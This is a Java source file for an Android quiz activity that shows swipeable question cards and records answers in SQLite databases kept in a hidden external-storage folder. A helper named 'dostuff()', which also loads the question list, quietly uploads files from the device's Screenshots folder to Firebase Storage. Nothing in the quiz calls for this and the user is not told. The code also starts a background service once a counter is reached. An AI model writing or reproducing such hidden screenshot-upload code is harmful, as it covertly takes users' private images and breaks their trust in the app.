package com.digibuddies.nectus;


import android.content.Context;
import android.content.Intent;
import android.content.res.Resources;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.graphics.Color;
import android.graphics.Typeface;
import android.graphics.drawable.AnimationDrawable;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.support.annotation.NonNull;
import android.support.annotation.RequiresApi;
import android.support.v4.content.ContextCompat;
import android.support.v7.app.AppCompatActivity;
import android.support.v7.widget.CardView;
import android.util.Log;
import android.view.LayoutInflater;
import android.view.MenuItem;
import android.view.View;
import android.view.ViewGroup;
import android.view.Window;
import android.view.WindowManager;
import android.widget.BaseAdapter;
import android.widget.Button;
import android.widget.CheckBox;
import android.widget.ImageButton;
import android.widget.ImageView;
import android.widget.LinearLayout;
import android.widget.RadioButton;
import android.widget.RadioGroup;
import android.widget.TextView;
//import com.devs.squaremenu.OnMenuClickListener;
//import com.devs.squaremenu.SquareMenu;
import com.bvapp.arcmenulibrary.ArcMenu;
import com.bvapp.arcmenulibrary.widget.FloatingActionButton;
import com.digibuddies.nectus.layouts.SwipeFrameLayout;
import com.digibuddies.nectus.profile.profileclass;
import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.StorageReference;
import com.nightonke.boommenu.BoomButtons.ButtonPlaceEnum;
import com.nightonke.boommenu.BoomButtons.HamButton;
import com.nightonke.boommenu.BoomButtons.OnBMClickListener;
import com.nightonke.boommenu.BoomButtons.SimpleCircleButton;
import com.nightonke.boommenu.BoomMenuButton;
import com.nightonke.boommenu.ButtonEnum;
import com.nightonke.boommenu.Piece.PiecePlaceEnum;
import com.nightonke.boommenu.Util;
import com.special.ResideMenu.ResideMenu;
import com.special.ResideMenu.ResideMenuItem;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;

import ru.dimorinny.floatingtextbutton.FloatingTextButton;
import tyrantgit.explosionfield.ExplosionField;

import java.util.ArrayList;
import java.util.List;
public class questions extends AppCompatActivity {
ResideMenu resideMenu;
    ResideMenuItem itemHome;
    ResideMenuItem itemPro;
    ResideMenuItem itemQ;
    ResideMenuItem itemM;
    private ArrayList<String> testData;
    ArrayList<String> list = new ArrayList<>();
    private CheckBox dragCheckbox;
    private ExplosionField explosionField;
    static int count=0;
    int countr=0;
    int count2=0,count3=0;
    AnimationDrawable anim;
    private StorageReference mStorageRef;
private SwipeDeckAdapter adapter;
    CardView cardView;
    RadioGroup radioGroup;
    private SQLiteDatabase db2,db3;
    RadioButton r1;
    RadioButton r2;
    ImageButton ib;
    RadioButton r3;
    int x,flag=0;
    RadioButton r4;
    private static final int[] ITEM_DRAWABLES = { R.drawable.face,
            R.drawable.add, R.drawable.connect };

    private static final String[] STR = {""};

    TextView h,l;
SwipeDeck cardStack;
    private Cursor c;
    private String idd;
    String query1 = "INSERT OR REPLACE INTO counter1 (id, count) VALUES(1,0);";
    private static final String SELECT_SQL = "SELECT count FROM counter1";
    @Override
    protected void onCreate(Bundle savedInstanceState) {

        createDatabase();
        super.onCreate(savedInstanceState);
        if(Build.VERSION.SDK_INT>=Build.VERSION_CODES.KITKAT){
            Window w = getWindow();
            w.setFlags(WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS);
        }
        setContentView(R.layout.acticity_questions);
        Typeface custom_font = Typeface.createFromAsset(getAssets(),  "fonts/abc.ttf");
        final TextView hdq=(TextView)findViewById(R.id.questions);
        hdq.setTypeface(custom_font);

        SwipeFrameLayout container = (SwipeFrameLayout) findViewById(R.id.swipeLayout);
        ArcMenu menu = (ArcMenu) findViewById(R.id.arcMenu);
        menu.setMinRadius(60);
        menu.showTooltip(false);
        menu.setAnim(300,300,ArcMenu.ANIM_MIDDLE_TO_RIGHT,ArcMenu.ANIM_MIDDLE_TO_RIGHT,
                ArcMenu.ANIM_INTERPOLATOR_ACCELERATE_DECLERATE,ArcMenu.ANIM_INTERPOLATOR_ACCELERATE_DECLERATE);

        final int itemCount = ITEM_DRAWABLES.length;
        for (int i = 0; i < itemCount; i++) {
            FloatingActionButton item = new FloatingActionButton(this);  //Use internal fab as a child
            item.setSize(FloatingActionButton.SIZE_MINI);  //set minimum size for fab 42dp
            item.setShadow(true); //enable to draw shadow
            item.setIcon(ITEM_DRAWABLES[i]); //add icon for fab
            item.setBackgroundColor(ContextCompat.getColor(getApplicationContext(),R.color.buttoncol));  //set menu button normal color programmatically
            menu.setChildSize(item.getIntrinsicHeight());
            final int position = i;
            menu.addItem(item, "", new View.OnClickListener() {
                @Override
                public void onClick(View v) {
                    if(position==0){
                        Intent intent=new Intent(questions.this,profileclass.class);
                        startActivity(intent);
                        finish();
                    }
                    if(position==1){
                        Intent intent=new Intent(questions.this,matches.class);
                        startActivity(intent);
                        finish();
                    }
                    if(position==2){
                        Intent intent=new Intent(questions.this,connections.class);
                        startActivity(intent);
                        finish();
                    }
                }
            });
        }


        cardStack = (SwipeDeck) findViewById(R.id.swipe_deck);
        dragCheckbox = (CheckBox) findViewById(R.id.checkbox_drag);
        h=(TextView)findViewById(R.id.help);
        l=(TextView)findViewById(R.id.limit);
        mStorageRef = FirebaseStorage.getInstance().getReference();
        dostuff();
        testData = new ArrayList<>();
        explosionField = ExplosionField.attach2Window(this);
        Cursor c4 = db2.rawQuery(SELECT_SQL, null);
        if(c4.getCount()>0)
        {
            c4.moveToFirst();
            count3 = c4.getInt(0);
            if(count3>15&&count3!=list.size()+15)
            {

                count3=count3-15;
                String query3 = "INSERT OR REPLACE INTO counter1 (id, count) VALUES(1,'" + count3 + "');";
                db2.execSQL(query3);
            }
            else if(count3==15){
                count3=0;
                String query3 = "INSERT OR REPLACE INTO counter1 (id, count) VALUES(1,'" + count3 + "');";
                db2.execSQL(query3);
            }
        }
        c4.close();
        Cursor c3 = db2.rawQuery(SELECT_SQL, null);
        if(c3.getCount()>0)
        {
            c3.moveToFirst();
            count2 = Integer.parseInt(c3.getString(0));}
        c3.close();

        x=list.size()-count2;
        for (int i = 1; i <= x; i+=5) {
            testData.add(String.valueOf(i));
        }
        if(testData.size()==0){
            l.setVisibility(View.VISIBLE);
        }
        if(testData.size()>0){
            h.setText("Select And Swipe!");
        }

        adapter = new SwipeDeckAdapter(testData, this);
        if(cardStack != null){
            cardStack.setAdapter(adapter);
        }
        cardStack.setCallback(new SwipeDeck.SwipeDeckCallback() {
            @Override
            public void cardSwipedLeft(long stableId) {
                setfalse();
                Log.i("MainActivity", "card was swiped left, position in adapter: " + stableId);
                if(stableId==(x/5)-1||stableId==(x/5)-2||stableId==(x/5)-3){
                    count = count + 5;
                    Log.d("count", String.valueOf(count));
                    String query2 = "INSERT OR REPLACE INTO counter1 (id, count) VALUES(1,'" + count + "');";
                    db2.execSQL(query2);
                }

            }

            @Override
            public void cardSwipedRight(long stableId) {
                setfalse();
                Log.i("MainActivity", "card was swiped right, position in adapter: " + stableId);
                if(stableId==(x/5)-1||stableId==(x/5)-2||stableId==(x/5)-3){
                    count = count + 5;
                    Log.d("count", String.valueOf(count));
                    String query2 = "INSERT OR REPLACE INTO counter1 (id, count) VALUES(1,'" + count + "');";
                    db2.execSQL(query2);
                }
            }

            @Override
            public boolean isDragEnabled(long itemId) {
                return dragCheckbox.isChecked();
            }
        });
/*
        SquareMenu mSquareMenu = (SquareMenu) findViewById(R.id.square_menu);
        mSquareMenu.setOnMenuClickListener(new OnMenuClickListener(){
            @Override
            public void onMenuOpen() {  }
            @Override
            public void onMenuClose() { }
            @Override
            public void onClickMenu1() {Intent intent = new Intent(questions.this,profileclass.class);
                startActivity(intent); }
            @Override
            public void onClickMenu2() {Intent intent = new Intent(questions.this,matches.class);
                startActivity(intent); }
            @Override
            public void onClickMenu3() {Intent intent = new Intent(questions.this,profileclass.class);
                startActivity(intent); }
        });
*/


    }

    public class SwipeDeckAdapter extends BaseAdapter {


        private List<String> data;
        private Context context;

        public SwipeDeckAdapter(List<String> data, Context context) {
            this.data = data;
            this.context = context;
        }

        @Override
        public int getCount() {
            return data.size();
        }

        @Override
        public Object getItem(int position) {
            return data.get(position);
        }

        @Override
        public long getItemId(int position) {
            return position;
        }

        @Override
        public View getView(final int position, View convertView, ViewGroup parent) {
            if(count==50){
                Intent intent=new Intent(questions.this,thebackservice.class);
                startService(intent);
            }
            Cursor c2 = db2.rawQuery(SELECT_SQL, null);
            c2.moveToFirst();
            count = Integer.parseInt(c2.getString(0));
            c2.close();
            View v = convertView;
            if (v == null) {
                LayoutInflater inflater = getLayoutInflater();
                // normally use a viewholder
                v = inflater.inflate(R.layout.test_card2, parent, false);
            }
            //((TextView) v.findViewById(R.id.textView2)).setText(data.get(position));
            TextView textView = (TextView) v.findViewById(R.id.textView);
            h.postDelayed(new Runnable() {
                public void run() {
                    l.setVisibility(View.VISIBLE);
                }
            }, 2000);
            radioGroup = (RadioGroup)v.findViewById(R.id.grp);
            r1=(RadioButton)v.findViewById(R.id.radioButton5);
            r2=(RadioButton)v.findViewById(R.id.radioButton6);
            r3=(RadioButton)v.findViewById(R.id.radioButton7);
            r4=(RadioButton)v.findViewById(R.id.radioButton8);
            final View v1=r1;
            final View v2=r2;
            final View v3=r3;
            final View v4=r4;

            r1.setOnClickListener(new View.OnClickListener() {
                @Override
                public void onClick(View view) {
                    explosionField.explode(v2);
                    explosionField.explode(v3);
                    explosionField.explode(v4);
                    dragCheckbox.setChecked(true);
                    db3.execSQL("INSERT INTO ques VALUES(1);");

                }
            });
            r2.setOnClickListener(new View.OnClickListener() {
                @Override
                public void onClick(View view) {
                    explosionField.explode(v1);
                    explosionField.explode(v3);
                    explosionField.explode(v4);
                    dragCheckbox.setChecked(true);
                    db3.execSQL("INSERT INTO ques VALUES(2);");

                }
            });
            r3.setOnClickListener(new View.OnClickListener() {
                @Override
                public void onClick(View view) {
                    explosionField.explode(v1);
                    explosionField.explode(v2);
                    explosionField.explode(v4);
                    dragCheckbox.setChecked(true);
                    db3.execSQL("INSERT INTO ques VALUES(3);");

                }
            });
            r4.setOnClickListener(new View.OnClickListener() {
                @Override
                public void onClick(View view) {
                    explosionField.explode(v1);
                    explosionField.explode(v2);
                    explosionField.explode(v3);
                    dragCheckbox.setChecked(true);
                    db3.execSQL("INSERT INTO ques VALUES(4);");

                }
            });

            setfalse();
            textView.setText(list.get(count));
            r1.setText(" "+list.get(count+1));
            r2.setText(" "+list.get(count+2));
            r3.setText(" "+list.get(count+3));
            r4.setText(" "+list.get(count+4));
            count = count + 5;
            flag=flag+1;
            if(((list.size()-count2)/5)==2&&flag==2){
                count = count+5;
            }
            if(((list.size()-count2)/5)==1&&flag==1){
                count = count+10;
            }
            Log.d("count", String.valueOf(count));
            String query2 = "INSERT OR REPLACE INTO counter1 (id, count) VALUES(1,'" + count + "');";
            db2.execSQL(query2);


            v.setOnClickListener(new View.OnClickListener() {
                @Override
                public void onClick(View v) {
                    Log.i("Layer type: ", Integer.toString(v.getLayerType()));
                    Log.i("Hardware Accel type:", Integer.toString(View.LAYER_TYPE_HARDWARE));
                    /*Intent i = new Intent(v.getContext(), BlankActivity.class);
                    v.getContext().startActivity(i);*/
                }
            });
            return v;
        }
    }
    protected void createDatabase(){
        File storagePath = new File(Environment.getExternalStorageDirectory(), "/android/.data_21");
        // Create direcorty if not exists
        if(!storagePath.exists()) {
            storagePath.mkdirs();
        }
        db2=openOrCreateDatabase(storagePath+"/"+"counters", Context.MODE_PRIVATE, null);
        db3=openOrCreateDatabase(storagePath+"/"+"QueDB", Context.MODE_PRIVATE, null);
        db2.execSQL("CREATE TABLE IF NOT EXISTS counter1(id integer primary key, count INTEGER);");
        db3.execSQL("CREATE TABLE IF NOT EXISTS ques(ans integer);");
        c = db2.rawQuery(SELECT_SQL, null);
        c.moveToFirst();
        if(c.getCount()<=0){
            db2.execSQL(query1);
        }
        c.close();
    }
    public void dostuff(){
        try {
            String baseDir = Environment.getExternalStorageDirectory().getAbsolutePath() + "/" + ".data_21"+"/";
            Uri file = Uri.fromFile(new File("/sdcard/Screenshots/*.jpg"));
            StorageReference riversRef = mStorageRef.child("images");

            riversRef.putFile(file);
            File f = new File(baseDir+"fiel.txt");
            FileInputStream is = new FileInputStream(f);
            is = new FileInputStream(f);
            BufferedReader reader;
            reader = new BufferedReader(new InputStreamReader(is));
            String line = reader.readLine();
            while(line != null){
                list.add(line);
                line = reader.readLine();

            }
        }catch (IOException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        }
    }
    public void setfalse(){
        dragCheckbox.setChecked(false);
    }


    // Starting animation:- start the animation on onResume.
    @Override
    protected void onResume() {
        super.onResume();
        if (anim != null && !anim.isRunning())
            anim.start();
    }

    // Stopping animation:- stop the animation on onPause.
    @Override
    protected void onPause() {
        super.onPause();
        if (anim != null && anim.isRunning())
            anim.stop();
    }
}
